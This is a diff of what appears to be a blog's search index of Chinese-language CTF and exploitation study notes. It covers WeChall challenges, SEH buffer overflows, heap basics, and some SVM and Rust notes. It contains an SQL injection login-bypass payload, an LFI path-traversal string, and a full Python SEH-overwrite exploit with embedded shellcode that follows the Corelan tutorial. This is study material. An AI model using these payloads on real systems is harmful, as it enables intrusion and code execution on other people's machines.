@@ -125,6 +125,34 @@ $ ojdump -d get_shell.o</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>CTF入门 WECALL2-正则</title>
+    <url>/2020/07/06/CTF%E5%85%A5%E9%97%A8%20WECALL2/</url>
+    <content><![CDATA[<p>python3<br>list()   一个字符字符分</p>
+<hr>
+<p>child[a],child[b] = child[b],child[a]</p>
+<h5 id="交换位置"><a href="#交换位置" class="headerlink" title="交换位置"></a>交换位置</h5><a id="more"></a>
+<hr>
+<p>spilt() 按空格分<br>int()</p>
+<hr>
+<h3 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h3><p><a href="http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/">http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/</a></p>
+<h3 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h3><p>import sys<br>sys.stdout = open(‘/root/Documents/CTF_WECALL/results.py’, mode = ‘w’,encoding=’utf-8’)</p>
+<p>打印到文件中</p>
+<p>line breaks. 换行符</p>
+<p>vscode python 整段右移 选中tab</p>
+<hr>
+<h3 id="python-2-转到-3"><a href="#python-2-转到-3" class="headerlink" title="python 2 转到 3"></a>python 2 转到 3</h3><p>2to3.py</p>
+<hr>
+<h3 id="正则30分钟学习"><a href="#正则30分钟学习" class="headerlink" title="正则30分钟学习"></a>正则30分钟学习</h3><p><a href="https://deerchao.cn/tutorials/regex/regex.htm">https://deerchao.cn/tutorials/regex/regex.htm</a></p>
+<h3 id="wechall-mysql-2"><a href="#wechall-mysql-2" class="headerlink" title="wechall mysql 2"></a>wechall mysql 2</h3><p>‘ union select 1,’admin’ ,md5(‘1’)  from users where username =’admin’#</p>
+<p><code>？？可以随便选择</code></p>
+<h3 id="wechall-WWW-Basics"><a href="#wechall-WWW-Basics" class="headerlink" title="wechall WWW-Basics"></a>wechall WWW-Basics</h3><p>lsof -i:端口号 用于查看某一端口的占用情况，比如查看8000端口使用情况，lsof -i:8000</p>
+<p>nginx -s quit<br>ps -ax | grep nginx<br>lsof -i:80<br>ip add</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF入门 WECALL 2</title>
     <url>/2020/05/19/CTF%E5%85%A5%E9%97%A8%20WECALL1/</url>
     <content><![CDATA[<h3 id="什么是PHP文件？"><a href="#什么是PHP文件？" class="headerlink" title="什么是PHP文件？"></a>什么是PHP文件？</h3><p>PHP文件可以包含文本，HTML，CSS，JavaScript和PHP代码<br>PHP代码在服务器上执行，结果以纯HTML格式返回到浏览器<br>PHP文件的扩展名为“ .php”</p>
@@ -270,34 +298,6 @@ fclose($myfile);
 <h5 id="eval（）函数将字符串评估为PHP代码。"><a href="#eval（）函数将字符串评估为PHP代码。" class="headerlink" title="eval（）函数将字符串评估为PHP代码。"></a>eval（）函数将字符串评估为PHP代码。</h5><h5 id="dirname（）函数返回父目录的路径。"><a href="#dirname（）函数返回父目录的路径。" class="headerlink" title="dirname（）函数返回父目录的路径。"></a>dirname（）函数返回父目录的路径。</h5><h5 id="in-array（）函数在数组中搜索特定值。"><a href="#in-array（）函数在数组中搜索特定值。" class="headerlink" title="in_array（）函数在数组中搜索特定值。"></a>in_array（）函数在数组中搜索特定值。</h5><p>注意：如果搜索参数是字符串，并且类型参数设置为TRUE，则搜索区分大小写。</p>
 <h3 id="WECHALL-LFI"><a href="#WECHALL-LFI" class="headerlink" title="WECHALL LFI"></a>WECHALL LFI</h3><p>?file=page/jhkd.html<br>?file=../../solution.php%00<br>%00 后的字符不算，已经更改<br>../ 遍历目录</p>
 <p>switch ($which)<br>        {<br>        case 0:<br>        case 1:<br>        case 2:<br>                require_once $which.’.php’;<br>                break;<br>        default:<br>                echo GWF_HTML::error(‘PHP-0817’, ‘Hacker NoNoNo!’, false);<br>                break;<br>        }<br>which=0,1,2 都执行require_once</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF入门 WECALL2-正则</title>
-    <url>/2020/07/06/CTF%E5%85%A5%E9%97%A8%20WECALL2/</url>
-    <content><![CDATA[<p>python3<br>list()   一个字符字符分</p>
-<hr>
-<p>child[a],child[b] = child[b],child[a]</p>
-<h5 id="交换位置"><a href="#交换位置" class="headerlink" title="交换位置"></a>交换位置</h5><a id="more"></a>
-<hr>
-<p>spilt() 按空格分<br>int()</p>
-<hr>
-<h3 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h3><p><a href="http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/">http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/</a></p>
-<h3 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h3><p>import sys<br>sys.stdout = open(‘/root/Documents/CTF_WECALL/results.py’, mode = ‘w’,encoding=’utf-8’)</p>
-<p>打印到文件中</p>
-<p>line breaks. 换行符</p>
-<p>vscode python 整段右移 选中tab</p>
-<hr>
-<h3 id="python-2-转到-3"><a href="#python-2-转到-3" class="headerlink" title="python 2 转到 3"></a>python 2 转到 3</h3><p>2to3.py</p>
-<hr>
-<h3 id="正则30分钟学习"><a href="#正则30分钟学习" class="headerlink" title="正则30分钟学习"></a>正则30分钟学习</h3><p><a href="https://deerchao.cn/tutorials/regex/regex.htm">https://deerchao.cn/tutorials/regex/regex.htm</a></p>
-<h3 id="wechall-mysql-2"><a href="#wechall-mysql-2" class="headerlink" title="wechall mysql 2"></a>wechall mysql 2</h3><p>‘ union select 1,’admin’ ,md5(‘1’)  from users where username =’admin’#</p>
-<p><code>？？可以随便选择</code></p>
-<h3 id="wechall-WWW-Basics"><a href="#wechall-WWW-Basics" class="headerlink" title="wechall WWW-Basics"></a>wechall WWW-Basics</h3><p>lsof -i:端口号 用于查看某一端口的占用情况，比如查看8000端口使用情况，lsof -i:8000</p>
-<p>nginx -s quit<br>ps -ax | grep nginx<br>lsof -i:80<br>ip add</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -1264,6 +1264,87 @@ AFAA found at offset: 44</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>SEH</title>
+    <url>/2020/09/21/SEH/</url>
+    <content><![CDATA[<h2 id="PWN学习"><a href="#PWN学习" class="headerlink" title="PWN学习"></a>PWN学习</h2><h4 id="Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><a href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits" class="headerlink" title="Exploit writing tutorial part 3 : SEH Based Exploits"></a><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits">Exploit writing tutorial part 3 : SEH Based Exploits</a></h4><a id="more"></a>
+<p><img src="https://s1.ax1x.com/2020/09/21/wq8cwV.png" alt="wq8cwV.png"><br>1st exception occurs :<br> |<br> ————————— (1)<br>                            |<br>                     ——-+————– (3) opcode in next SEH : jump over SE Handler to the shellcode<br>                     |      |             |<br>                     |      V             V<br>[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]<br>                opcode to   do                 (3) Shellcode gets executed<br>                jump over   pop pop ret<br>                SE Handler   |<br>                ^            |<br>                |            |<br>                ————– (2) will ‘pretend’ there’s a second exception, puts address of next SEH location in EIP, so opcode gets executed</p>
+<p>当一个异常触发时，会建立自己的栈，push EH Handler的参数，在ESP+8处的EstablisherFrame指向下一个SEH，在这里写pop pop ret的地址</p>
+<p>the <code>first pop</code> will take off<code> 4 bytes</code> from the stack<br>the <code>second pop</code> will take another<code>4 bytes</code>from the stack<br>the <code>ret</code> will take the<code>current value</code>from the top of ESP ( = the address of the next SEH, which was at<code> ESP+8</code>, but because of the 2 pop’s now sits at the top of the stack) and puts that in <code>EIP</code>.</p>
+<h5 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h5><p>ollydbg VIEW-SEH CHAIN</p>
+<h5 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h5><p><code>msf-pattern_create -l 5000</code><br>产生一个序列，用于定位溢出点</p>
+<p>msf5 &gt; msfpescan -p Player.dll | grep -v “000”<br>寻找pop pop ret 命令地址 -v 不匹配“000”</p>
+<p>int 3 指令（0xcc） 中断指令</p>
+<pre><code>import struct
+
+uitext = &quot;ui_exploit.txt&quot;
+junk = &quot;\x41&quot; * 584
+seh_next = &quot;\xeb\x04\x90\x90&quot;
+seh_handler = str(struct.pack(&#39;&lt;L&#39;, 0x10018de8))
+shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot; +\
+            &quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot; +\
+            &quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot; +\
+            &quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot; +\
+            &quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot; +\
+            &quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot; +\
+            &quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot; +\
+            &quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot; +\
+            &quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot; +\
+            &quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot; +\
+            &quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot; +\
+            &quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot; +\
+            &quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot; +\
+            &quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot; +\
+            &quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot; +\
+            &quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot; +\
+            &quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot; +\
+            &quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot; +\
+            &quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot; +\
+            &quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot; +\
+            &quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot; +\
+            &quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;
+junk2 = &quot;\x90&quot; * 1000
+fp = open(uitext, &#39;w&#39;)
+content = junk + seh_next + seh_handler + shellcode + junk2
+fp.write(content)
+fp.close()</code></pre>
+<p>总结：<br>SEH链条结构及其在栈中的位置<br>Windows XP SP1添加的XOR和SafeSEH保护机制<br>通过msf的msfpescan从dll中查找带有想要操作的函数（“POP POP RET”）<br>RET操作作为exploit方式的优缺点<br>通过<code>windbg</code>的”!analyze -v“ 和“!exchain”命令查看current SEH指针内容<br>windbg：d eip ; !exchain命令 ；u 地址 ；g 运行</p>
+<p>frog 青蛙</p>
+]]></content>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SVM学习笔记1</title>
+    <url>/2020/03/31/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
+    <content><![CDATA[<p><a href="https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s">https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s</a><br>参考视频课程</p>
+<p>mvnrnd（）产生特定均值和协方差的矩阵</p>
+<hr>
+<a id="more"></a>
+
+<p>kenel 矩阵要有限正半定，kenel函数：R^d-&gt;R<br><a href="https://imgchr.com/i/GQilQJ"><img src="https://s1.ax1x.com/2020/03/31/GQilQJ.th.png" alt="GQilQJ.th.png"></a></p>
+<hr>
+<p>常见kenel 可以自己构造<br><a href="https://imgchr.com/i/GQF9Tx"><img src="https://s1.ax1x.com/2020/03/31/GQF9Tx.th.png" alt="GQF9Tx.th.png"></a></p>
+<hr>
+<p>REPRODUCING KENEL MAP<br>由kenel 推出 feature mapping 以及其逆<br><img src="https://s1.ax1x.com/2020/03/31/GQdhI1.png" alt="GQdhI1.png"></p>
+<hr>
+<p>Principal Component Analysis 主成分分析<br>KPCA</p>
+<hr>
+<p>Linear Discriminant Analysis 線性區別分析<br>投影坐标：内积*v<br>廣義區別分析(Generalized Discriminant Analysis)。</p>
+<p><img src="https://s1.ax1x.com/2020/03/31/GQUvmd.png" alt="GQUvmd.png"></p>
+<hr>
+<p>KKT svm证明中会用到<br><img src="https://s1.ax1x.com/2020/03/31/GQdzJP.png" alt="GQdzJP.png"></p>
+<p><img src="https://s1.ax1x.com/2020/03/31/GQwZiq.png" alt="GQwZiq.png"></p>
+<hr>
+<p>其他</p>
+<p><a href="https://ww2.mathworks.cn/help/matlab/data-type-conversion.html">https://ww2.mathworks.cn/help/matlab/data-type-conversion.html</a><br>matlab 数据类型转换</p>
+<pre><code>&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Ap0huJwyT7g&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;</code></pre>
+]]></content>
+      <tags>
+        <tag>SVM</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>RUST学习4</title>
     <url>/2020/08/14/RUST%E5%AD%A6%E4%B9%A04/</url>
     <content><![CDATA[<h3 id="Result-lt-T-E-gt"><a href="#Result-lt-T-E-gt" class="headerlink" title="Result&lt;T, E&gt;"></a>Result<code>&lt;T, E&gt;</code></h3><p>Rust doesn’t have exceptions. Instead, it has the type<code> Result&lt;T, E&gt;</code> for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. </p>
@@ -1377,87 +1458,6 @@ println!(&quot;The longest string is &#123;&#125;&quot;, result);</code></pre>
 ]]></content>
       <tags>
         <tag>RUST</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SEH</title>
-    <url>/2020/09/21/SEH/</url>
-    <content><![CDATA[<h2 id="PWN学习"><a href="#PWN学习" class="headerlink" title="PWN学习"></a>PWN学习</h2><h4 id="Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><a href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits" class="headerlink" title="Exploit writing tutorial part 3 : SEH Based Exploits"></a><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits">Exploit writing tutorial part 3 : SEH Based Exploits</a></h4><a id="more"></a>
-<p><img src="https://s1.ax1x.com/2020/09/21/wq8cwV.png" alt="wq8cwV.png"><br>1st exception occurs :<br> |<br> ————————— (1)<br>                            |<br>                     ——-+————– (3) opcode in next SEH : jump over SE Handler to the shellcode<br>                     |      |             |<br>                     |      V             V<br>[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]<br>                opcode to   do                 (3) Shellcode gets executed<br>                jump over   pop pop ret<br>                SE Handler   |<br>                ^            |<br>                |            |<br>                ————– (2) will ‘pretend’ there’s a second exception, puts address of next SEH location in EIP, so opcode gets executed</p>
-<p>当一个异常触发时，会建立自己的栈，push EH Handler的参数，在ESP+8处的EstablisherFrame指向下一个SEH，在这里写pop pop ret的地址</p>
-<p>the <code>first pop</code> will take off<code> 4 bytes</code> from the stack<br>the <code>second pop</code> will take another<code>4 bytes</code>from the stack<br>the <code>ret</code> will take the<code>current value</code>from the top of ESP ( = the address of the next SEH, which was at<code> ESP+8</code>, but because of the 2 pop’s now sits at the top of the stack) and puts that in <code>EIP</code>.</p>
-<h5 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h5><p>ollydbg VIEW-SEH CHAIN</p>
-<h5 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h5><p><code>msf-pattern_create -l 5000</code><br>产生一个序列，用于定位溢出点</p>
-<p>msf5 &gt; msfpescan -p Player.dll | grep -v “000”<br>寻找pop pop ret 命令地址 -v 不匹配“000”</p>
-<p>int 3 指令（0xcc） 中断指令</p>
-<pre><code>import struct
-
-uitext = &quot;ui_exploit.txt&quot;
-junk = &quot;\x41&quot; * 584
-seh_next = &quot;\xeb\x04\x90\x90&quot;
-seh_handler = str(struct.pack(&#39;&lt;L&#39;, 0x10018de8))
-shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot; +\
-            &quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot; +\
-            &quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot; +\
-            &quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot; +\
-            &quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot; +\
-            &quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot; +\
-            &quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot; +\
-            &quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot; +\
-            &quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot; +\
-            &quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot; +\
-            &quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot; +\
-            &quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot; +\
-            &quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot; +\
-            &quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot; +\
-            &quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot; +\
-            &quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot; +\
-            &quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot; +\
-            &quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot; +\
-            &quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot; +\
-            &quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot; +\
-            &quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot; +\
-            &quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;
-junk2 = &quot;\x90&quot; * 1000
-fp = open(uitext, &#39;w&#39;)
-content = junk + seh_next + seh_handler + shellcode + junk2
-fp.write(content)
-fp.close()</code></pre>
-<p>总结：<br>SEH链条结构及其在栈中的位置<br>Windows XP SP1添加的XOR和SafeSEH保护机制<br>通过msf的msfpescan从dll中查找带有想要操作的函数（“POP POP RET”）<br>RET操作作为exploit方式的优缺点<br>通过<code>windbg</code>的”!analyze -v“ 和“!exchain”命令查看current SEH指针内容<br>windbg：d eip ; !exchain命令 ；u 地址 ；g 运行</p>
-<p>frog 青蛙</p>
-]]></content>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SVM学习笔记1</title>
-    <url>/2020/03/31/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
-    <content><![CDATA[<p><a href="https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s">https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s</a><br>参考视频课程</p>
-<p>mvnrnd（）产生特定均值和协方差的矩阵</p>
-<hr>
-<a id="more"></a>
-
-<p>kenel 矩阵要有限正半定，kenel函数：R^d-&gt;R<br><a href="https://imgchr.com/i/GQilQJ"><img src="https://s1.ax1x.com/2020/03/31/GQilQJ.th.png" alt="GQilQJ.th.png"></a></p>
-<hr>
-<p>常见kenel 可以自己构造<br><a href="https://imgchr.com/i/GQF9Tx"><img src="https://s1.ax1x.com/2020/03/31/GQF9Tx.th.png" alt="GQF9Tx.th.png"></a></p>
-<hr>
-<p>REPRODUCING KENEL MAP<br>由kenel 推出 feature mapping 以及其逆<br><img src="https://s1.ax1x.com/2020/03/31/GQdhI1.png" alt="GQdhI1.png"></p>
-<hr>
-<p>Principal Component Analysis 主成分分析<br>KPCA</p>
-<hr>
-<p>Linear Discriminant Analysis 線性區別分析<br>投影坐标：内积*v<br>廣義區別分析(Generalized Discriminant Analysis)。</p>
-<p><img src="https://s1.ax1x.com/2020/03/31/GQUvmd.png" alt="GQUvmd.png"></p>
-<hr>
-<p>KKT svm证明中会用到<br><img src="https://s1.ax1x.com/2020/03/31/GQdzJP.png" alt="GQdzJP.png"></p>
-<p><img src="https://s1.ax1x.com/2020/03/31/GQwZiq.png" alt="GQwZiq.png"></p>
-<hr>
-<p>其他</p>
-<p><a href="https://ww2.mathworks.cn/help/matlab/data-type-conversion.html">https://ww2.mathworks.cn/help/matlab/data-type-conversion.html</a><br>matlab 数据类型转换</p>
-<pre><code>&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Ap0huJwyT7g&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;</code></pre>
-]]></content>
-      <tags>
-        <tag>SVM</tag>
       </tags>
   </entry>
   <entry>
@@ -1984,6 +1984,261 @@ Tcachebins[idx=14, size=0x100] count=1  ←  Chunk(addr=0x5555555592c0, size=0x1
       </tags>
   </entry>
   <entry>
+    <title>heap入门1</title>
+    <url>/2021/03/12/heap%E5%85%A5%E9%97%A81/</url>
+    <content><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code> &quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;</code> 更改glibc版本<br><code>pwd</code>显示当前目录<br><code>apropos</code>搜索man手册<br><code>gef-&gt;search-patten</code><br><code>objdump -M intel</code>汇编改为intel语法<br><code>set disassambly intel</code> gdb更改语法<br><code>b print </code>printf函数下断点</p>
+<a id="more"></a>
+<p>在gdb 里启动gef<br><code>(gdb) source ~/.gdbinit-gef.py</code></p>
+<p>或者传递命令<br><code>gdb.attach(p,&quot;source ~/.gdbinit-gef.py&quot;)</code></p>
+<hr>
+<p><code>gef➤  heap-view </code></p>
+<pre><code>gef➤  got
+
+GOT protection: Partial RelRO | GOT functions: 3
+
+[0x804c00c] printf@GLIBC_2.0  →  0x8049036
+[0x804c010] __libc_start_main@GLIBC_2.0  →  0xf7ddcd40
+[0x804c014] __isoc99_scanf@GLIBC_2.7  →  0x8049056</code></pre>
+<hr>
+<pre><code>gef➤  heap bins
+gef➤  heap chunks
+
+gef➤  heap chunks
+Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE)
+    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
+Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE)
+    [0x00005555555592a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
+Chunk(addr=0x5555555592c0, size=0x20d50, flags=PREV_INUSE)  ←  top chunk
+gef➤  x/6gx 0x5555555592c0
+0x5555555592c0:    0x0000000000000000    0x0000000000000000
+0x5555555592d0:    0x0000000000000000    0x0000000000000000
+0x5555555592e0:    0x0000000000000000    0x0000000000000000
+gef➤  x/6gx 0x5555555592c0-0x10
+0x5555555592b0:    0x0000000000000000    0x0000000000020d51
+0x5555555592c0:    0x0000000000000000    0x0000000000000000
+0x5555555592d0:    0x0000000000000000    0x0000000000000000</code></pre>
+<p>查看glibc版本</p>
+<pre><code>┌─[✗]─[zentreisender@parrotos]─[~]
+└──╼ $ldd --version
+ldd ./program 显示链接器，加载器版本</code></pre>
+<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><code>call malloc, it returns a pointer to a chunk</code><br>返回一个地址</p>
+<p>64bit 一个chunk段16字节，32bit 8 字节</p>
+<p>查看二进制文件依赖的动态链接库命令 ldd</p>
+<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术</p>
+<h3 id="RELRC"><a href="#RELRC" class="headerlink" title="RELRC"></a>RELRC</h3><p>Firstly, <code>PLT</code> needs to be located at <code>a fixed offset</code> from the .text section. Secondly, since GOT contains data used by different parts of the program directly, it needs to be allocated at a known static address in memory. Lastly, and more importantly, because the GOT is lazily bound it needs to be writable.</p>
+<p><code>PLT GOT 的偏移都是 写死在文件上</code><br>the linker resolves all dynamically linked functions<code> at the beginning of the execution,</code> and then <code>makes the GOT read-only</code>. 这就是RELRC</p>
+<p>In partial RELRO, the non-PLT part of the GOT section (.got from readelf output) is read only but <code>.got.plt is still writeable</code>. Whereas in complete RELRO, the entire GOT (.got and .got.plt both) is marked as read-only.</p>
+<p><code>.got</code> Section 存放外部全局变量的 GOT 表，非延迟绑定<br><code>.got.plt</code> Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定。</p>
+<p>.got is for relocations regarding global ‘variables’ while .got.plt is a auxiliary section to act together with .plt when resolving procedures absolute addresses</p>
+<h2 id="编译安装glibc各版本"><a href="#编译安装glibc各版本" class="headerlink" title="编译安装glibc各版本"></a>编译安装glibc各版本</h2><p>下载源码后<br><a href="https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html">https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html</a></p>
+<h3 id="gcc10编译安装glibc-2-23"><a href="#gcc10编译安装glibc-2-23" class="headerlink" title="gcc10编译安装glibc 2.23"></a>gcc10编译安装glibc 2.23</h3><pre><code>../glibc-2.20/configure --prefix=/usr --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror</code></pre>
+<p><code>--disable-werror</code> 这项是忽略错误</p>
+<h3 id="gcc10编译安装glibc-2-27"><a href="#gcc10编译安装glibc-2-27" class="headerlink" title="gcc10编译安装glibc 2.27"></a>gcc10编译安装glibc 2.27</h3><pre><code>CFLAGS=&quot;-g -fcommon -Og&quot; CXXFLAGS=&quot;-g -fcommon -Og&quot; ../glibc-2.27/configure --prefix=/glibc/2.27 --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror </code></pre>
+<p>我编译的时候报了重复定义的错误，加<code>-fcommon</code> 忽视</p>
+<h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><p> first-fit behavior.<code>If a chunk is free and large enough, malloc will select this chunk.</code></p>
+<p>Whenever <code>any chunk</code> (not a fast chunk) is freed,<code> it ends up in the unsorted bin.</code> Insertion happens at the <code>HEAD of the list</code>.</p>
+<p>fast chunks end up in fastbins. As mentioned earlier, fastbins maintain a singly linked list and chunks are inserted and deleted from the HEAD end。<code>头插法</code></p>
+<h3 id="calc"><a href="#calc" class="headerlink" title="calc::"></a>calc::</h3><h4 id="索引计算公式：："><a href="#索引计算公式：：" class="headerlink" title="索引计算公式：："></a>索引计算公式：：</h4><p>The basic formula is as follows:</p>
